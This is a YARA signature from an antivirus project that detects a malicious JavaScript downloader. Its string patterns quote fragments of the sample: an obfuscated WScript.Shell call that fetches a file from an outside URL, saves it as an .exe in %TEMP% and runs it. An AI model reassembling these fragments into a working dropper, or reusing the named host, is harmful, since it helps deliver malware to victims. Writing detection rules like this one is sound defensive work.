rule sig_20160328_8132b76703a1fb799a06f518bdd8cad7 {
  meta:
    description = "datamaliciousorder - file 20160328_8132b76703a1fb799a06f518bdd8cad7.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "e25956f2ab9715343faf77c39ee95d5d1233fa9b5ad47ed719de2c84da8e9a5e"

  strings:
    $s1  = "function Mxqvk() {return Zpggekmpw[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"OBh33m1L6uh.exe\";};" fullword ascii
    $s2  = "Uwikqe[Qzavms](\"GET\", \"http://aicuiibf.com/l30woad\", false);" fullword ascii
    $s3  = "do {WScript[Hzzmgbvum](Asltotrqm() * 11)} while (Uwikqe[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Zpggekmpw = function Ijsittd() {return WScript[Cyrwpdzqi](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Uifpcquvs(Bsbgstj, Csmlcxsqiz){return Bsbgstj - Csmlcxsqiz;};" fullword ascii
    $s6  = "function Lwrxlu() {return ((Wxifg == true) && (Wxifg == Gprgwulc)) ? 1 : Tdgzssw;};" fullword ascii
    $s7  = "function Bdspbtp(Lrymjbs){Zpggekmpw[\"Run\"](Lrymjbs, Tdgzssw, Tdgzssw);};" fullword ascii
    $s8  = "return Uifpcquvs(Smycrfxcu, Fvbfar);" fullword ascii
    $s9  = "function Asltotrqm(){return 22;};" fullword ascii
    $s10 = "function Vymodoabw()" fullword ascii
    $s11 = "var Gprgwulc = false;" fullword ascii
    $s12 = "function Njjjt(){return Fcgvqaz;};" fullword ascii
    $s13 = "var Qdlfptxmci = new this[\"Date\"]();" fullword ascii
    $s14 = " while (Zzlwid){" fullword ascii
    $s15 = "function Pygap(Htbdbm) {var Fnrab = (1, 2, 3, 4, 5, Htbdbm); return Fnrab;};" fullword ascii
    $s16 = "Wxifg = true; " fullword ascii
    $s17 = "function Zlgekg(){return Cyrwpdzqi;};" fullword ascii
    $s18 = "Gprgwulc = true; " fullword ascii
    $s19 = "var Ksmlhprlq = false;" fullword ascii
    $s20 = "var Wxifg = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}